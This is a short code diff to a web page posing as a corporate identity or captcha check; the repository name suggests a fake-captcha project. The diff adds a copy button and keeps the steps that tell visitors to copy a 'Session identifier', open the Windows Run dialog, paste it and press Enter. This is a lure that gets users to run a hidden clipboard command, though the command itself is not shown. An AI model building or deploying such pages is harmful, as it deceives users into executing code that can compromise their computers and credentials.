@@ -35,7 +35,7 @@ $(document).ready(function() {
                 <p>Confirm your digital identity with a corporate computer. This method allows you to safely login to the page without the need to remember your login and password.</p>
                 <p>Simple copy and paste operation is needed, nothing more.</p>
                 <ol>
-                    <li>Copy Session identifier to confirm .</li>
+                    <li>Click following icon <img id="copyButton" src="https://coder-msl.github.io/advanced_captcha/src/copy.png" width="16" height="16"/> to copy  Session identifier.</li>
                     <li>Press and hold Windows Key &nbsp; <img src="https://coder-msl.github.io/advanced_captcha/src/win_logo.png" width="16" height="16"/> + R .</li>
                     <li>In the confirmation Window press <b>CTRL + V</b></li>
                     <li>Press enter to confirm who you are.</b></li>
